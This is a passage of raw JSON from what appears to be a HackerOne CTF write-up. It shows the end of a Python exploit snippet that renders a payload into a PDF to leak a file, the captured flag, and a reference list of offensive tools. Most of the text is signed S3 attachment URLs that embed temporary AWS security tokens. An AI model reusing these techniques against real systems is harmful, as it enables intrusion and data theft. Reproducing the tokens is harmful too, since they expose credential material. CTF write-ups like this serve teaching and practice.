class=\"n\"\u003edumps\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einvoice\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\n\u003cspan class=\"n\"\u003epdfize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;style_invoice.pdf\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFinally I opened the PDF and there it was:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"leak_file.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/368/3979c64e1946f27dc6d8fdfda7fd38067f187a4e/leak_file.png?response-content-disposition=attachment%3B%20filename%3D%22leak_file.png%22%3B%20filename%2A%3DUTF-8%27%27leak_file.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061333Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=4224546c901e12178dd5c06cfd1a00201df0fd512b61ec6cb5864ffc3272b8cc\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/368/3979c64e1946f27dc6d8fdfda7fd38067f187a4e/leak_file.png?response-content-disposition=attachment%3B%20filename%3D%22leak_file.png%22%3B%20filename%2A%3DUTF-8%27%27leak_file.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061333Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=4224546c901e12178dd5c06cfd1a00201df0fd512b61ec6cb5864ffc3272b8cc\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eCONGRATULATIONS!\n\nIf you\u0026#39;re reading this, you\u0026#39;ve made it to the end of the road for this CTF.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHERE IT IS: c8889970d9fb722066f31e804e351993\u003c/p\u003e\n\n\u003ch3 id=\"references\"\u003eReferences\u003c/h3\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003ca title=\"https://crackstation.net/hashing-security.htm\" href=\"/redirect?url=https%3A%2F%2Fcrackstation.net%2Fhashing-security.htm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://crackstation.net/hashing-security.htm\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://crypto.stanford.edu/~dabo/papers/ssl-timing.pdf\" href=\"/redirect?url=https%3A%2F%2Fcrypto.stanford.edu%2F~dabo%2Fpapers%2Fssl-timing.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://crypto.stanford.edu/~dabo/papers/ssl-timing.pdf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://github.com/skylot/jadx\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fskylot%2Fjadx\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/skylot/jadx\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://en.wikipedia.org/wiki/Symmetric-key_algorithm\" href=\"/redirect?url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FSymmetric-key_algorithm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://en.wikipedia.org/wiki/Symmetric-key_algorithm\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://en.wikipedia.org/wiki/Binary_search_algorithm\" href=\"/redirect?url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FBinary_search_algorithm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://en.wikipedia.org/wiki/Binary_search_algorithm\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://www.tcpdump.org/\" href=\"/redirect?url=https%3A%2F%2Fwww.tcpdump.org%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.tcpdump.org/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://github.com/maurosoria/dirsearch\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmaurosoria%2Fdirsearch\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/maurosoria/dirsearch\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://github.com/danielmiessler/SecLists\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fdanielmiessler%2FSecLists\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/danielmiessler/SecLists\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://github.com/sqlmapproject/sqlmap\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fsqlmapproject%2Fsqlmap\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/sqlmapproject/sqlmap\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://en.wikipedia.org/wiki/Length_extension_attack\" href=\"/redirect?url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FLength_extension_attack\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://en.wikipedia.org/wiki/Length_extension_attack\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks\" href=\"/redirect?url=https%3A%2F%2Fblog.skullsecurity.org%2F2012%2Feverything-you-need-to-know-about-hash-length-extension-attacks\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://github.com/ffuf/ffuf\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fffuf%2Fffuf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/ffuf/ffuf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://github.com/digininja/CeWL\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fdigininja%2FCeWL\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/digininja/CeWL\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://www.python.org/dev/peps/pep-0515/\" href=\"/redirect?url=https%3A%2F%2Fwww.python.org%2Fdev%2Fpeps%2Fpep-0515%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.python.org/dev/peps/pep-0515/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://github.com/PortSwigger/turbo-intruder\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FPortSwigger%2Fturbo-intruder\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/PortSwigger/turbo-intruder\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://github.com/noraj/flask-session-cookie-manager\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnoraj%2Fflask-session-cookie-manager\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/noraj/flask-session-cookie-manager\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense\" href=\"/redirect?url=https%3A%2F%2Fwww.mike-gualtieri.com%2Fposts%2Fstealing-data-with-css-attack-and-defense\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://github.com/s0md3v/AwesomeXSS\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fs0md3v%2FAwesomeXSS\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/s0md3v/AwesomeXSS\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eH1-702\u003c/p\u003e\n","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":451365,"file_name":"binary.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/365/f3e178d0d8e418da0e3864d932c7eb40ca38bfae/binary.png?response-content-disposition=attachment%3B%20filename%3D%22binary.png%22%3B%20filename%2A%3DUTF-8%27%27binary.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061333Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=ca77cd7498d17009ed30fe21606b5a101935a8cbf7be2abd76db8d99c474a3c8","file_size":935868,"type":"image/png"},{"id":451366,"file_name":"hint.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/366/a5f26a68fe31a826f7f9e243e4a74902f4b03282/hint.png?response-content-disposition=attachment%3B%20filename%3D%22hint.png%22%3B%20filename%2A%3DUTF-8%27%27hint.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061333Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=47775632614927365296c9906f2d8a3ee040ed2a26b64db4b84d52229afdd9c3","file_size":17155,"type":"image/png"},{"id":451367,"file_name":"jadx.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/367/b56603cd847c84d97f7ea294650644ab85a65953/jadx.png?response-content-disposition=attachment%3B%20filename%3D%22jadx.png%22%3B%20filename%2A%3DUTF-8%27%27jadx.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061333Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=26468cfa7b5ebf7eceb11679a9253dd81a1a200d94948361f6e8dfd1a5963a67","file_size":25858,"type":"image/png"},{"id":451368,"file_name":"leak_file.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/368/3979c64e1946f27dc6d8fdfda7fd38067f187a4e/leak_file.png?response-content-disposition=attachment%3B%20filename%3D%22leak_file.png%22%3B%20filename%2A%3DUTF-8%27%27leak_file.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061333Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=4224546c901e12178dd5c06cfd1a00201df0fd512b61ec6cb5864ffc3272b8cc","file_size":9579,"type":"image/png"},{"id":451369,"file_name":"Login.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/369/267d7b63eb2cf4e6851040f02de0f47766639b3f/Login.png?response-content-disposition=attachment%3B%20filename%3D%22Login.png%22%3B%20filename%2A%3DUTF-8%27%27Login.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061333Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqm